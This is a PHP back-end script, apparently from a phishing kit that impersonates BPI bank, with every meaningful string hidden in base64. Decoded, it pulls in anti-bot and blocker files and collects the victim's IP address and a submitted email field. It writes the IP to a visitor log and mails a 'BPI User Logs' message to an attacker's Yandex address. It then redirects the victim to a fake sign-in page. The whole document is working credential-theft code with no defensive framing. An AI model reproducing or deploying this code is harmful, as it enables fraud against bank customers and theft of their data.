<?php include(base64_decode('c2lnbi1pbi9jb25maWcvYW50aWJvdHMucGhw'));
include(base64_decode('c2lnbi1pbi9jb25maWcvYmxvY2tlci5waHA='));
include(base64_decode('c2lnbi1pbi9jb25maWcvYnQucGhw'));
date_default_timezone_set(base64_decode('QXNpYS9NYW5pbGE='));
$time = date(base64_decode('aDppOnMgQQ=='));
$ip = getenv(base64_decode('UkVNT1RFX0FERFI='));
$bank = base64_decode('c3A0bW1lcnNAeWFuZGV4LmNvbQ==');
$subject = " [ + ] ~~ BPI User Logs ~~ [ + ] from $ip ";
$headers = base64_decode('RnJvbSA6IFplcmlvbg==');
$headers .= $_POST[base64_decode('ZU1haWxBZGQ=')].base64_decode('Cg==');
$headers .= base64_decode('TUlNRS1WZXJzaW9uOiAxLjAK');
$pane .= base64_decode('PGJyPjxiIHN0eWxlPSJjb2xvcjpsaW1lOyI+SVAgOiA=').$ip.base64_decode('PC9iPjxicj48YiBzdHlsZT0iY29sb3I6YmxhY2s7IjwvYj48YnI+PGJyPg==');
$fh = fopen(base64_decode('c2lnbi1pbi92aXNpdG9yLnR4dA==') ,base64_decode('YQ=='));
fwrite($fh, base64_decode('IA==').''.$pane .base64_decode('Cgo='));
fclose($fh);
if (mail($bank,$subject,$message,$headers))
	   {
		   header(base64_decode('TG9jYXRpb246IHNpZ24taW4vbG9naW4ucGhw'));

	   }
else
    	   {
 		echo base64_decode('RVJST1IhIFBsZWFzZSBnbyBiYWNrIGFuZCB0cnkgYWdhaW4u');
  	   }
?>